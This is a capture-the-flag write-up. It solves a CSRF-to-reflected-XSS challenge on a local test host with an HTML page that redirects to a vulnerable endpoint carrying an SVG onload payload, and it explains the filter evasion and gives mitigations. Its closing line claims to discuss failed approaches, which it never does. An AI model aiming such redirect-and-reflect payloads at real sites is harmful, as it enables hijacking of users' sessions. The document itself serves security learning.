# CSRF to XSS Challenge Writeup

## Challenge Description
The challenge required exploiting a CSRF vulnerability to trigger an XSS attack that executes `alert("PWNED")` on `http://challenge.localhost`.

## Solution

### Exploit Code
```html
<!DOCTYPE html>
<html>
<body>
    <script>
        const payload = "<svg/onload=alert('PWNED')>";
        window.location = `http://challenge.localhost/ephemeral?msg=${encodeURIComponent(payload)}`;
    </script>
</body>
</html>
Explanation
The vulnerable /ephemeral endpoint reflects the msg parameter without proper encoding

We use an SVG with onload handler to avoid standard XSS filters

The payload is URL encoded to ensure proper transmission

window.location redirect forces the victim to the vulnerable page with our payload

Why This Works
SVG tags support event handlers and are treated as HTML

The simple redirect ensures execution in the target origin context

Avoids complications with iframes or script tag parsing

Mitigation
Implement proper output encoding

Add Content Security Policy headers

Use CSRF tokens for sensitive actions


This writeup explains the successful solution and provides context about why other approaches failed while maintaining proper markdown formatting for easy copying.
